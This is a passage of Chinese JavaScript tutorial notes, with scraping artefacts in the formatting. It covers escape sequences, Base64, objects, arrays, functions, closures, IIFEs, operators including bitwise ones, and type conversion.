：后退键（\u0008）\f ：换页符（\u000C）\n ：换行符（\u000A）\r ：回车键（\u000D）\t ：制表符（\u0009）\v ：垂直制表符（\u000B）\' ：单引号（\u0027）\" ：双引号（\u0022）\\ ：反斜杠（\u005C）// 反斜杠还有三种特殊用法\HHH // 反斜杠后面紧跟三个八进制数（000到377），代表一个字符 HHH对应该字符的 Unicode 码点, 只能输出256种字符。 如\251表示版权符号\xHH // \x后面紧跟两个十六进制数（00到FF），代表一个字符 HH对应该字符的 Unicode 码点，只能输出256种字符比如\xA9表示版权符号\uXXXX // \u后面紧跟四个十六进制数（0000到FFFF），代表一个字符 XXXX对应该字符的 Unicode 码点，比如\u00A9表示版权符号// 如果在非特殊字符前面使用反斜杠，则反斜杠会被省略。'\a' // "a"``` * 字符集:JavaScript 引擎内部，所有字符都用 Unicode 表示。不仅以 Unicode 储存字符，还允许直接在程序中使用 Unicode 码点表示字符。每个字符在 JavaScript 内部都是以16位（即2个字节）的 UTF-16 格式储存。也就是说，JavaScript 的单位字符长度固定为16位长度，即2个字节。对于码点在U+10000到U+10FFFF之间的字符，JavaScript 总是认为它们是两个字符（length属性为2）。所以处理的时候，必须把这一点考虑在内，也就是说，JavaScript 返回的字符串长度可能是不正确的。 如 '𝌆'.length === 2* Base64 转码： 一种编码方法，可以将任意值转成 0～9、A～Z、a-z、+和/这64个字符组成的可打印字符。文本里面包含一些不可打印的符号，比如 ASCII 码0到31的符号都无法打印出来，这时可以使用 Base64 编码，将它们转成可以打印的字符。有时需要以文本格式传递二进制数据，那么也可以使用 Base64 编码。使用它的主要目的，不是为了加密，而是为了不出现特殊字符，简化程序的处理。JavaScript 原生提供两个 Base64 相关的方法， 但不适合非 ASCII 码的字符，会报错btoa()：任意值转为 Base64 编码atob()：Base64 编码转为原来的值```JavaScriptvar str = 'Hello World!';btoa(str) // "SGVsbG8gV29ybGQh"atob('SGVsbG8gV29ybGQh') // "Hello World! 要将非 ASCII 码字符转为 Base64 编码，必须中间插入一个转码环节，再使用encodeURIComponent、decodeURIComponent这两个方法123456789101112// 任意值转为 Base64 编码function b64Encode(str) &#123; return btoa(encodeURIComponent(str));&#125;// Base64 编码转为原来的值function b64Decode(str) &#123; return decodeURIComponent(atob(str));&#125;b64Encode('你好') // "JUU0JUJEJUEwJUU1JUE1JUJE"b64Decode('JUU0JUJEJUEwJUU1JUE1JUJE') // "你好" 对象对象就是一组“键值对”（key-value）成员的集合，是一种无序的复合数据集合。对象的所有键名都是字符串（ES6 又引入了 Symbol 值也可以作为键名），所以加不加引号都可以。如果键名是数值，会被自动转为字符串。如果键名不符合标识名的条件（比如第一个字符为数字，或者含有空格或运算符），且也不是数字，则必须加上引号，否则会报错。 对象的每一个键名又称为“属性”（property），它的“键值”可以是任何数据类型。如果一个属性的值为函数，通常把这个属性称为“方法”，它可以像函数那样调用。属性可以动态创建，不必在对象声明时就指定。 对象的引用1234567891011121314151617// 如果不同的变量名指向同一个对象，那么它们都是这个对象的引用，也就是说指向同一个内存地址。修改其中一个变量，会影响到其他所有变量。var o1 = &#123;&#125;;var o2 = o1;o1.a = 1;o2.a // 1// 此时，如果取消某一个变量对于原对象的引用，不会影响到另一个变量var o1 = &#123;&#125;;var o2 = o1;o1 = 1;o2 // &#123;&#125;// 但是，这种引用只局限于对象，如果两个变量指向同一个原始类型的值。那么，变量这时都是值的拷贝var x = 1;var y = x;x = 2;y // 1 属性的操作 读取对象的属性有两种方法，一种是使用点运算符，还有一种是使用方括号运算符。请注意，如果使用方括号运算符，键名必须放在引号里面，否则会被当作变量处理。方括号运算符内部还可以使用表达式。数字键可以不加引号，因为会自动转成字符串，但数值键名不能使用点运算符（因为会被当成小数点），只能使用方括号运算符。 123456789var foo = 'bar';var obj = &#123; foo: 1, bar: 2&#125;;obj.foo // 1 引用对象obj的foo属性时，如果使用点运算符，foo就是字符串obj[foo] // 2 如果使用方括号运算符，但是不使用引号，那么foo就是一个变量，指向字符串bar 属性的查看Object.keys(obj): 返回对象自身的所有可枚举的属性名称的数组Object.values(obj): 返回给定对象自身可枚举值的数组Object.entries(): 返回一个给定对象自身可枚举属性的键值对数组 12345678910const obj = &#123; foo: 'bar', baz: 42 &#125;Object.keys(obj) // ['foo', 'baz']Object.values(obj) // ['bar', 42]Object.entries(object1) // [[ 'foo', 'bar' ], [ 'baz', 42 ]]for (let key in obj) &#123; console.log('key:', key, 'value: ',obj[key]) // key: foo value: bar // key: baz value: 42&#125; 属性的遍历for…in 遍历对象自身的和继承的可枚举的属性。 对象obj继承了toString属性，该属性不会被for…in循环遍历到，因为它默认是“不可遍历”的。 属性是否存在：in 运算符，如’name’ in obj，检查对象是否包含某个属性（注意，检查的是键名，不是键值），如果包含就返回true，否则返回false。它不能识别哪些属性是对象自身的，哪些属性是继承的。 hasOwnProperty：是否为对象自身的属性。如 obj.hasOwnProperty(‘toString’)) false 属性的删除delete: 删除对象本身的属性，无法删除继承的属性，删除成功后返回true。 注意，删除一个不存在的属性，delete不报错，而且返回true。只有一种情况，delete命令会返回false，那就是该属性存在，且不得删除。 数组数组（array）是按次序排列的一组值。每个值的位置都有编号（从0开始），整个数组用方括号表示。本质上，数组属于一种特殊的对象。typeof运算符会返回数组的类型是object。JavaScript 使用一个32位整数，保存数组的元素个数。这意味着，数组成员最多只有 4294967295 个（2^32 - 1），length属性的最大值就是 4294967295。 清空数组的一个有效方法，就是将length属性设为0。 in 运算符检查某个键名是否存在的运算符in，适用于对象，也适用于数组。 数组的遍历可以考虑使用for循环、while循环，或者forEach。 不推荐使用for…in遍历数组。 123456789101112131415161718192021222324252627282930313233343536373839var arr = [ 'a', 'b', 'c' ]typeof arr // "object"'2' in arr // true 数组存在键名为2的键2 in arr // true 由于键名都是字符串，所以数值2会自动转成字符串4 in arr // falsevar arr2 = [1, 2, 3];arr2.foo = true;// for循环for(var i = 0; i &lt; arr2.length; i++) &#123; console.log(arr2[i]);&#125;// while循环var i = 0;while (i &lt; arr2.length) &#123; console.log(arr2[i]); i++;&#125;// 逆向遍历var len = arr2.length;while (len--) &#123; console.log(arr2[len]); // 3 2 1 &#125;// forEacharr2.forEach(function (val) &#123; console.log(val)&#125;)// for...in循环不仅可以遍历对象，也可以遍历数组，毕竟数组只是一种特殊对象。但是，for...in不仅会遍历数组所有的数字键，还会遍历非数字键for (var key in arr2) &#123; console.log(key); // 0 1 2 foo&#125; 数组的空位当数组的某个位置是空元素，即两个逗号之间没有任何值，我们称该数组存在空位（hole）。 123456789var a = [1, , 2,]// 数组的空位不影响length属性a.length // 3 // 使用delete命令删除一个数组成员，会形成空位，并且不会影响length属性delete a[2] // truea[1] // undefineda.length // 3 length属性不过滤空位。所以，使用length属性进行数组遍历，一定要非常小心数组的某个位置是空位，与某个位置是undefined，是不一样的。如果是空位，使用数组的forEach方法、for…in结构、以及Object.keys方法进行遍历，空位都会被跳过。如果某个位置是undefined，遍历的时候就不会被跳过,输出undefined。 类似数组的对象 array-like object如果一个对象的所有键名都是正整数或零，并且有length属性，那么这个对象就很像数组，语法上称为“类似数组的对象”但是，“类似数组的对象”并不是数组，因为它们不具备数组特有的方法。没有数组的push方法，使用该方法就会报错。length属性不是动态值，不会随着成员的变化而变。典型的“类似数组的对象”是函数的arguments对象，以及大多数 DOM 元素集，还有字符串。12345678910111213141516var obj = &#123; 0: 'a', 1: 'b', 2: 'c', length: 3&#125;// 数组的slice方法可以将“类似数组的对象”变成真正的数组。var arr = Array.prototype.slice.call(arrayLike);// 除了转为真正的数组，“类似数组的对象”还有一个办法可以使用数组的方法，就是通过call()把数组的方法放到对象上面。var arr = Array.prototype.forEach.call(arrayLike, print)function print(value, index) &#123; console.log(index + ' : ' + value);&#125; 函数函数是一段可以反复调用的代码块。函数还能接受输入的参数，不同的参数会返回不同的值。 函数的声明JavaScript 有三种声明函数的方法。12345678910111213141516171819// function 命令function print(s) &#123; console.log(s)&#125;// 函数表达式 // 采用函数表达式声明函数时，function命令后面不带有函数名。如果加上函数名，该函数名只在函数体内部有效，在函数体外部无效var print = function(s) &#123; console.log(s)&#125;; // 函数的表达式需要在语句的结尾加上分号，表示语句结束// Function 构造函数 // Function构造函数可以不使用new命令，返回结果完全一样// 最后一个参数是函数的“函数体”，其他参数都是add函数的参数。如果只有一个参数，该参数就是函数体。var add = new Function('x', 'y', 'return x + y');// 等同于function add(x, y) &#123; return x + y;&#125; 函数的重复声明: 函数名视同变量名，函数名会提升。如果同一个函数被多次声明，后面的声明就会覆盖前面的声明。 第一等公民: 函数与其他数据类型地位平等，所以在 JavaScript 语言中又称函数为第一等公民。 函数的属性和方法name: 函数的name属性返回函数的名字1234567891011121314151617function f1() &#123;&#125;f1.name // "f1"// 如果是通过变量赋值定义的函数，那么name属性返回变量名var f2 = function () &#123;&#125;;f2.name // "f2"// 但是，上面这种情况，只有在变量的值是一个匿名函数时才是如此。如果变量的值是一个具名函数，那么name属性返回function关键字之后的那个函数名。var f3 = function myName() &#123;&#125;;f3.name // 'myName' 返回了函数表达式的名字。注意，真正的函数名还是f3，而myName这个名字只在函数体内部可用。// name属性的一个用处，就是获取参数函数的名字var myFunc = function () &#123;&#125;;function test(f) &#123; console.log(f.name);&#125;test(myFunc) // myFunc 函数test内部通过name属性，就可以知道传入的参数是什么函数。 length： 函数的length属性返回函数预期传入的参数个数，即函数定义之中的参数个数。与实际传入的参数个数无关。 toString(): 函数的toString方法返回一个字符串，内容是函数的源码。函数内部的注释也可以返回。利用这一点，可以变相实现多行字符串。12345678910111213var multiline = function (fn) &#123; var arr = fn.toString().split('\n'); return arr.slice(1, arr.length - 1).join('\n');&#125;;function f() &#123;/* 这是一个 多行注释*/&#125;multiline(f);// " 这是一个// 多行注释" 函数本身的作用域函数本身也是一个值，也有自己的作用域。它的作用域与变量一样，就是其声明时/定义时所在的作用域，与其运行时/调用时所在的作用域无关。 1234567891011var a = 1;var x = function () &#123; console.log(a);&#125;;function f() &#123; var a = 2; x();&#125;f() // 1 函数x是在函数f的外部声明的，所以它的作用域绑定外层，内部变量a不会到函数f体内取值，所以输出1，而不是2。 参数的传递方式 1234567891011121314151617181920212223// 参数如果是原始类型的值（数值、字符串、布尔值），传递方式是传值传递（passes by value）。这意味着，在函数体内修改参数值，不会影响到函数外部。var p1 = 2;function f(p1) &#123; p1 = 3;&#125;f(p1);p1 // 2// 参数是复合类型的值（数组、对象、其他函数），传递方式是传址传递（pass by reference）。传入函数的原始值的地址，在函数内部修改参数，将会影响到原始值。var obj1 = &#123; p2: 1 &#125;;function f(o) &#123; o.p2 = 2;&#125;f(obj1);obj1.p2 // 2// 如果函数内部修改的，不是参数对象的某个属性，而是替换掉整个参数，这时不会影响到原始值var obj2 = [1, 2, 3];function f(o) &#123; o = [2, 3, 4];&#125;f(obj2);obj2 // [1, 2, 3] 这是因为，形式参数（o）的值实际是参数obj的地址，重新对o赋值导致o指向另一个地址，保存在原地址上的值当然不受影响 arguments 对象由于 JavaScript 允许函数有不定数目的参数，所以需要一种机制，可以在函数体内部读取所有参数。这就是arguments对象的由来。arguments对象包含了函数运行时的所有参数，arguments[0]就是第一个参数，arguments[1]就是第二个参数，以此类推。这个对象只有在函数体内部，才可以使用。通过arguments对象的length属性，可以判断函数调用时到底带几个参数。正常模式下，arguments对象可以在运行时修改。严格模式下，arguments对象与函数参数不具有联动关系。也就是说，修改arguments对象不会影响到实际的函数参数。 需要注意的是，虽然arguments很像数组，但它是一个对象。数组专有的方法（比如slice和forEach），不能在arguments对象上直接使用。如果要让arguments对象使用数组方法，真正的解决方法是将arguments转为真正的数组。12345678// slice方法var args = Array.prototype.slice.call(arguments);// 逐一填入新数组var args = [];for (var i = 0; i &lt; arguments.length; i++) &#123; args.push(arguments[i]);&#125; 闭包 closure理解闭包，首先必须理解变量作用域。前面提到，JavaScript 有两种作用域：全局作用域和函数作用域。函数内部可以直接读取全局变量。但是，函数外部无法读取函数内部声明的变量。 如果出于种种原因，需要得到函数内的局部变量。正常情况下，这是办不到的，只有通过变通方法才能实现。那就是在函数的内部，再定义一个函数。 这就是 JavaScript 语言特有的”链式作用域”结构（chain scope），子对象会一级一级地向上寻找所有父对象的变量。所以，父对象的所有变量，对子对象都是可见的，反之则不成立。 既然f2可以读取f1的局部变量，那么只要把f2作为返回值，我们不就可以在f1外部读取它的内部变量了吗！1234567891011function f1() &#123; var n = 999; // 闭包就是函数f2，即能够读取其他函数内部变量的函数。 function f2() &#123; console.log(n); &#125; return f2; &#125;var result = f1();result(); // 999 由于在 JavaScript 语言中，只有函数内部的子函数才能读取内部变量，因此可以把闭包简单理解成“定义在一个函数内部的函数”。闭包最大的特点，就是它可以“记住”诞生的环境，比如f2记住了它诞生的环境f1，所以从f2可以得到f1的内部变量。在本质上，闭包就是将函数内部和函数外部连接起来的一座桥梁。 闭包的最大用处有两个，一个是可以读取函数内部的变量，另一个就是让这些变量始终保持在内存中，即闭包可以使得它诞生环境一直存在。闭包可以看作是函数内部作用域的一个接口，闭包使得内部变量记住上一次调用时的运算结果。始终在内存中，不会在调用结束后，被垃圾回收机制回收。 闭包的另一个用处，是封装对象的私有属性和私有方法。123456789101112131415161718192021function Person(name) &#123; var _age; function setAge(n) &#123; _age = n; &#125; function getAge() &#123; return _age; &#125; return &#123; name: name, getAge: getAge, setAge: setAge &#125;;&#125;var p1 = Person('张三');p1.setAge(25);p1.getAge() // 25// 上面代码中，函数Person的内部变量_age，通过闭包getAge和setAge，变成了返回对象p1的私有变量。 注意，外层函数每次运行，都会生成一个新的闭包，而这个闭包又会保留外层函数的内部变量，所以内存消耗很大。因此不能滥用闭包，否则会造成网页的性能问题。 立即调用的函数表达式 IIFE （Immediately-Invoked Function Expression）在 JavaScript 中，圆括号()是一种运算符，跟在函数名之后，表示调用该函数。比如，print()就表示调用print函数。 有时，我们需要在定义函数之后，立即调用该函数。这时，你不能在函数的定义之后加上圆括号，这会产生语法错误。1234567function()&#123; /* code */ &#125;(); // Uncaught SyntaxError: Unexpected token (// 产生这个错误的原因是，function这个关键字即可以当作语句，也可以当作表达式。// 语句function f() &#123;&#125;// 表达式var f = function f() &#123;&#125; 为了避免解析上的歧义，JavaScript 引擎规定，如果function关键字出现在行首，一律解释成语句。因此，JavaScript 引擎看到行首是function关键字之后，认为这一段都是函数的定义，不应该以圆括号结尾，所以就报错了。 解决方法就是不要让function出现在行首，让引擎将其理解成一个表达式。最简单的处理，就是将其放在一个圆括号里面。1234567891011// 下面两种写法都是以圆括号开头，引擎就会认为后面跟的是一个表示式，而不是函数定义语句，所以就避免了错误。这就叫做“立即调用的函数表达式”，简称 IIFE。(function()&#123; /* code */ &#125;());(function()&#123; /* code */ &#125;)();// 注意，上面两种写法最后的分号都是必须的。如果省略分号，遇到连着两个 IIFE，可能就会报错。// 推而广之，任何让解释器以表达式来处理函数定义的方法，都能产生同样的效果，比如下面三种写法。!function () &#123; /* code */ &#125;();~function () &#123; /* code */ &#125;();-function () &#123; /* code */ &#125;();+function () &#123; /* code */ &#125;(); 通常情况下，只对匿名函数使用这种“立即执行的函数表达式”。它的目的有两个：一是不必为函数命名，避免了污染全局变量；二是 IIFE 内部形成了一个单独的作用域，可以封装一些外部无法读取的私有变量。 运算符运算符是处理数据的基本方法，用来从现有的值得到新的值。JavaScript 提供了多种运算符，覆盖了所有主要的运算。 算术运算符JavaScript 共提供10个算术运算符，用来完成基本的算术运算。加法x + y、 减法 x - y、 乘法 x * y、 除法x / y、 指数x ** y、 余数x % y、 自增++x 或者 x++、 自减–x 或者 x–、 数值 +x、 负数值-x 加法运算符 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// 加法运算符（+）是最常见的运算符，用来求两个数值的和。1 + 1 // 2// JavaScript 允许非数值的相加。true + true // 2 布尔值都会自动转成数值，然后再相加1 + true // 2// 如果是两个字符串相加，这时加法运算符会变成连接运算符，返回一个新的字符串，将两个原字符串连接在一起。'a' + 'bc' // "abc"// 如果一个运算子是字符串，另一个运算子是非字符串，这时非字符串会转成字符串，再连接在一起。1 + 'a' // "1a"false + 'a' // "falsea"// 加法运算符是在运行时决定，到底是执行相加，还是执行连接。也就是说，运算子的不同，导致了不同的语法行为，这种现象称为“重载”（overload）'3' + 4 + 5 // "345"3 + 4 + '5' // "75"// 除了加法运算符，其他算术运算符（比如减法、除法和乘法）都不会发生重载。它们的规则是：所有运算子一律转为数值，再进行相应的数学运算。1 - '2' // -11 * '2' // 21 / '2' // 0.5// 对象的相加 如果运算子是对象，必须先转成原始类型的值，然后再相加。var obj1 = &#123; p: 1 &#125;;obj1 + 2 // "[object Object]2"// 对象转成原始类型的值，规则如下。// 首先，自动调用对象的valueOf方法。一般来说，对象的valueOf方法总是返回对象自身，这时再自动调用对象的toString方法，将其转为字符串。对象的toString方法默认返回[object Object]var obj1 = &#123; p: 1 &#125;;obj1.valueOf() // &#123;p: 1&#125;obj1.valueOf().toString() // "[object Object]"// 知道了这个规则以后，就可以自己定义valueOf方法或toString方法，得到想要的结果。var obj2 = &#123; valueOf: function () &#123; return 1; &#125;&#125;;obj2 + 2 // 3var obj3 = &#123; toString: function () &#123; return 'hello'; &#125;&#125;;obj3 + 2 // "hello2" 只要有一个运算子是字符串，加法运算符就变成连接运算符，返回连接后的字符串。// 这里有一个特例，如果运算子是一个Date对象的实例，那么会优先执行toString方法。var obj4 = new Date();obj4.valueOf = function () &#123; return 1 &#125;;obj4.toString = function () &#123; return 'hello' &#125;;obj4 + 2 // "hello2" 余数运算符余数运算符（%）返回前一个运算子被后一个运算子除，所得的余数。 123456789101112 % 5 // 2// 需要注意的是，运算结果的正负号由第一个运算子的正负号决定。-1 % 2 // -11 % -2 // 1// 所以，为了得到负数的正确余数值，可以先使用绝对值函数。function isOdd(n) &#123; // return n % 2 === 1; // 错误的写法 return Math.abs(n % 2) === 1&#125; 自增和自减运算符自增和自减运算符，是一元运算符，只需要一个运算子。它们的作用是将运算子首先转为数值，然后加上1或者减去1。它们会修改原始变量。 运算之后，变量的值发生变化，这种效应叫做运算的副作用（side effect）。自增和自减运算符是仅有的两个具有副作用的运算符，其他运算符都不会改变变量的值。 注意，运算符放在变量之后，会先返回变量操作前的值，再进行自增/自减操作；放在变量之前，会先进行自增/自减操作，再返回变量操作后的值。12345var x = 1;var y = 1;x++ // 1++y // 2 布尔运算符布尔运算符用于将表达式转为布尔值，一共包含四个运算符。 取反运算符：!将布尔值变为相反值, 对于非布尔值，取反运算符会将其转为布尔值12345678910111213141516// undefined、null、false、0、NaN、空字符串（''）六个值取反后为true，其他值都为false。!undefined // true!null // true!0 // true!NaN // true!"" // true!54 // false!'hello' // false![] // false!&#123;&#125; // false// 对一个值连续做两次取反运算，等于将其转为对应的布尔值，与Boolean函数的作用相同。这是一种常用的类型转换的写法。!!x// 等同于Boolean(x) 且运算符 &amp;&amp;它的运算规则是：如果第一个运算子的布尔值为true，则返回第二个运算子的值（注意是值，不是布尔值）；如果第一个运算子的布尔值为false，则直接返回第一个运算子的值，且不再对第二个运算子求值。12345678if (i) &#123; doSomething()&#125;// 等价于i &amp;&amp; doSomething()// 且运算符可以多个连用，这时返回第一个布尔值为false的表达式的值。如果所有表达式的布尔值都为true，则返回最后一个表达式的值。true &amp;&amp; 0 &amp;&amp; 3 // 0 或运算符 ||如果第一个运算子的布尔值为true，则返回第一个运算子的值，且不再对第二个运算子求值；如果第一个运算子的布尔值为false，则返回第二个运算子的值。12345678910// 或运算符可以多个连用，这时返回第一个布尔值为true的表达式的值。如果所有表达式都为false，则返回最后一个表达式的值。false || 0 || '' || 4 || 'foo' || true // 4// 或运算符常用于为一个变量设置默认值。function saveText(text) &#123; text = text || ''; // ...&#125;// 或者写成saveText(this.text || '') 三元运算符 ? :JavaScript 语言唯一一个需要三个运算子的运算符。如果第一个表达式的布尔值为true，则返回第二个表达式的值，否则返回第三个表达式的值。 通常来说，三元条件表达式与if…else语句具有同样表达效果，前者可以表达的，后者也能表达。但是两者具有一个重大差别，if…else是语句，没有返回值；三元条件表达式是表达式，具有返回值。所以，在需要返回值的场合，只能使用三元条件表达式，而不能使用if..else12345't' ? 'hello' : 'world' // "hello"0 ? 'hello' : 'world' // "world"console.log(true ? 'T' : 'F')// 上面代码中，console.log方法的参数必须是一个表达式，这时就只能使用三元条件表达式。如果要用if...else语句，就必须改变整个代码写法了。 二进制位运算符二进制位运算符用于直接对二进制位进行计算，一共有7个。 这些位运算符直接处理每一个比特位（bit），所以是非常底层的运算，好处是速度极快，缺点是很不直观，许多场合不能使用它们，否则会使代码难以理解和查错。 有一点需要特别注意，位运算符只对整数起作用，遇到小数时，会将小数部分舍去，只保留整数部分，如果一个运算子不是整数，会自动转为整数后再执行。另外，虽然在 JavaScript 内部，数值都是以64位浮点数的形式储存，但是做位运算的时候，是以32位带符号的整数进行运算的，并且返回值也是一个32位带符号的整数。 二进制或运算符（or）：符号为|，表示若两个二进制位之中只要有一个为1，则结果为1，否则为012340 | 3 // 3 0和3的二进制形式分别是00和11，所以进行二进制或运算会得到11（即3）// 位运算只对整数有效，遇到小数时，会将小数部分舍去，只保留整数部分。所以，将一个小数与0进行二进制或运算，等同于对该数去除小数部分，即取整数位。i = i | 0; // 就是将i（不管是整数或小数）转为32位整数。 2147483649.4 | 0; // -2147483647 不适用超过32位整数最大值2147483647的数 二进制与运算符（and）：符号为&amp;，表示若两个二进制位都为1，则结果为1，否则为010 &amp; 3 // 0 0（二进制00）和3（二进制11）进行二进制与运算会得到00（即0） 二进制否运算符（not）：符号为~，表示对一个二进制位取反（0变为1，1变为0）12345678910111213141516171819~ 3 // -4// JavaScript 内部将所有的运算子都转为32位的二进制整数再进行运算。 3的32位整数形式是00000000000000000000000000000011，二进制否运算以后得到11111111111111111111111111111100。由于第一位（符号位）是1，所以这个数是一个负数。JavaScript 内部采用补码形式表示负数，即需要将这个数减去1，再取一次反，然后加上负号，才能得到这个负数对应的10进制值。这个数减去1等于11111111111111111111111111111011，再取一次反得到00000000000000000000000000000100，再加上负号就是-4。// 可以简单记忆成，一个数与自身的取反值相加，等于-1。~ -3 // 2// 对一个整数连续两次二进制否运算，得到它自身。~~3 // 3// 使用二进制否运算取整，是所有取整方法中最快的一种。~~1.999 // 1// 对字符串进行二进制否运算，JavaScript 引擎会先调用Number函数，将字符串转为数值。~'011' // -12 // 相当于~Number('011')// 对于其他类型的值，二进制否运算也是先用Number转为数值，然后再进行处理。~[] // -1 // 相当于 ~Number([])~NaN // -1 // 相当于 ~Number(NaN)~null // -1 // 相当于 ~Number(null) 异或运算符（xor）：符号为^，表示若两个二进制位不相同，则结果为1，否则为0123456789101112130 ^ 3 // 3 0（二进制00）与3（二进制11）进行异或运算，它们每一个二进制位都不同，所以得到11（即3）// 异或运算 有一个特殊运用，连续对两个数a和b进行三次异或运算，可以互换它们的值。 这是互换两个变量的值的最快方法。var a = 2, b = 3a ^= b b ^= a a ^= ba // 3b // 2// 异或运算也可以用来取整。12.9 ^ 0 // 12 左移运算符（left shift）：符号为&lt;&lt; ，表示将一个数的二进制值向左移动指定的位数，尾部补0，即乘以2的指定次方。12345678910111213141516171819204 &lt;&lt; 1 // 8 4 的二进制形式为100，左移一位为1000（即十进制的8），相当于乘以2的1次方-4 &lt;&lt; 1 // -8 // 如果左移0位，就相当于将该数值转为32位整数，等同于取整，对于正数和负数都有效。13.5 &lt;&lt; 0 // 13-13.5 &lt;&lt; 0 // -13// 左移运算符用于二进制数值非常方便。// 使用左移运算符，将颜色的 RGB 值转为 HEX 值// RGB to HEX// (1 &lt;&lt; 24)的作用为保证结果是6位数var rgb2hex = function(r, g, b) &#123; return '#' + ((1 &lt;&lt; 24) + (r &lt;&lt; 16) + (g &lt;&lt; 8) + b) .toString(16) // 先转成十六进制，然后返回字符串 .substr(1); // 去除字符串的最高位，返回后面六个字符串&#125;var color = &#123;r: 186, g: 218, b: 85&#125;;rgb2hex(color.r, color.g, color.b) // "#bada55" 右移运算符（right shift）：符号为&gt;&gt;，表示将一个数的二进制值向右移动指定的位数，头部补0，即除以2的指定次方（最高位即符号位不参与移动）123454 &gt;&gt; 1 // 2 4的二进制形式为 00000000000000000000000000000100，右移一位得到00000000000000000000000000000010，即为十进制的2-4 &gt;&gt; 1 // -2 -4的二进制形式为11111111111111111111111111111100，右移一位，头部补1，得到11111111111111111111111111111110,即为十进制的-2// 右移运算可以模拟 2 的整除运算。21 &gt;&gt; 3 // 2 相当于 21 / 8 = 2 带符号位的右移运算符（zero filled right shift）：符号为&gt;&gt;&gt; ，表示将一个数的二进制形式向右移动，包括符号位也参与移动，头部补0。所以，该运算总是得到正值。对于正数，该运算的结果与右移运算符（&gt;&gt;）完全一致，区别主要在于负数。1234564 &gt;&gt;&gt; 1 // 2-4 &gt;&gt;&gt; 1 // 2147483646 将-4的二进制形式，带符号位的右移一位，得到01111111111111111111111111111110，即为十进制的2147483646// 这个运算实际上将一个值转为32位无符号整数。// 查看一个负整数在计算机内部的储存形式，最快的方法就是使用这个运算符。-1 &gt;&gt;&gt; 0 // 4294967295 // -1作为32位整数时，内部的储存形式使用无符号整数格式解读，值为 4294967295，即(2^32)-1，等于11111111111111111111111111111111 void 运算符void运算符的作用是执行一个表达式，然后不返回任何值，或者说返回undefined。123456789101112// void运算符的优先性很高，建议总是使用圆括号void 0 // undefinedvoid(0) // undefined // 这个运算符的主要用途是浏览器的书签工具（Bookmarklet），以及在超级链接中插入代码防止网页跳转。&lt;a href="http://example.com" onclick="f(); return false;"&gt;点击&lt;/a&gt; // 点击链接后，会先执行onclick的代码，由于onclick返回false，所以浏览器不会跳转到 example.com。// void运算符可以取代上面的写法。&lt;a href="javascript: void(f())"&gt;文字&lt;/a&gt;// 下面是一个更实际的例子，用户点击链接提交表单，但是不产生页面跳转。&lt;a href="javascript: void(document.form.submit())"&gt;提交&lt;/a&gt; 逗号运算符逗号运算符用于对两个表达式求值，并返回后一个表达式的值。逗号运算符的一个用途是，在返回一个值之前，进行一些辅助操作。1234567var x = 0;var y = (x++, 10);x // 1y // 10var value = (console.log('Hi!'), true); // Hi!value // true 运算顺序 运算符的优先级别（Operator Precedence） 圆括号的作用圆括号不是运算符，而是一种语法结构，所以不具有求值作用。共有两种用法：一种是把表达式放在圆括号之中，提升运算的优先级，它的优先级是最高的；跟在函数的后面，作用是调用函数。 12345678910// 函数放在圆括号中，会返回函数本身。如果圆括号紧跟在函数的后面，就表示调用函数。function f() &#123; return 1;&#125;(f) // function f()&#123;return 1;&#125;f() // 1// 圆括号之中，只能放置表达式，如果将语句放在圆括号之中，就会报错。(var a = 1) // SyntaxError: Unexpected token var 左结合与右结合对于优先级别相同的运算符，大多数情况，计算顺序总是从左到右，这叫做运算符的“左结合”（left-to-right associativity），即从左边开始计算。 少数运算符的计算顺序是从右到左，即从右边开始计算，这叫做运算符的“右结合”。一元运算符(逻辑非、按位非、一元加/减、前置递增/减、typeof、void、delete、await)、赋值运算符（=）、三元条件运算符（?:）和 指数运算符（**）、yield等123w = x = y = z; // 相当于 w = (x = (y = z));q = a ? b : c ? d : e ? f : g; // 相当于 q = a ? b : (c ? d : (e ? f : g));2 ** 3 ** 2 // 512 相当于 2 ** (3 ** 2) 数据类型的转换JavaScript 是一种动态类型语言，变量没有类型限制，可以随时赋予任意值。 强制转换强制转换主要指使用Number()、String()和Boolean()三个函数，手动将各种类型的值，分别转换成数字、字符串或者布尔值。 Number() 可以将任意类型的值转化成数值。分两种情况，一种是参数是原始类型的值，另一种是参数是对象。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253// 原始类型值的转换规则如下:// 数值：转换后还是原来的值Number(324) // 324// 字符串：如果可以被解析为数值，则转换为相应的数值Number('324') // 324// 字符串：如果不可以被解析为数值，返回 NaNNumber('324abc') // NaN// 空字符串转为0Number('') // 0// 布尔值：true 转成 1，false 转成 0Number(true) // 1Number(false) // 0// undefined：转成 NaNNumber(undefined) // NaN// null：转成0Number(null) // 0// Number函数将字符串转为数值，要比parseInt函数严格很多。基本上，只要有一个字符无法转成数值，整个字符串就会被转为NaN。parseInt('42 cats') // 42 parseInt逐个解析字符Number('42 cats') // NaN Number函数整体转换字符串的类型// parseInt和Number函数都会自动过滤一个字符串前导和后缀的空格。parseInt('\t\v\r12.34\n') // 12Number('\t\v\r12.34\n') // 12.34// 对象:// 第一步，调用对象自身的valueOf方法。如果返回原始类型的值，则直接对该值使用Number函数，不再进行后续步骤。// 第二步，如果valueOf方法返回的还是对象，则改为调用对象自身的toString方法。如果toString方法返回原始类型的值，则对该值使用Number函数，不再进行后续步骤。// 第三步，如果toString方法返回的是对象，就报错// Number方法的参数是对象时，将返回NaN，除非是包含单个数值的数组。Number(&#123;a: 1&#125;) // NaNNumber([1, 2, 3]) // NaNNumber([5]) // 5// 默认情况下，对象的valueOf方法返回对象本身，所以一般总是会调用toString方法，而toString方法返回对象的类型字符串（比如[object Object]）Number(&#123;&#125;) // NaN// valueOf和toString方法，都是可以自定义的。valueOf方法先于toString方法执行Number(&#123; valueOf: function () &#123; return 2; &#125;, toString: function () &#123; return 3; &#125;&#125;) String() 将任意类型的值转化成字符串 分两种情况，一种是参数是原始类型的值，另一种是参数是对象。 1234567891011121314151617181920212223// 原始类型值:// 数值：转为相应的字符串。// 字符串：转换后还是原来的值。// 布尔值：true转为字符串"true"，false转为字符串"false"。// undefined：转为字符串"undefined"。// null：转为字符串"null"String(123) // "123"String('abc') // "abc"String(true) // "true"String(undefined) // "undefined"String(null) // "null"// 对象: // String方法背后的转换规则，与Number方法基本相同，只是互换了valueOf方法和toString方法的执行顺序。// 先调用对象自身的toString方法。如果返回原始类型的值，则对该值使用String函数，不再进行以下步骤。// 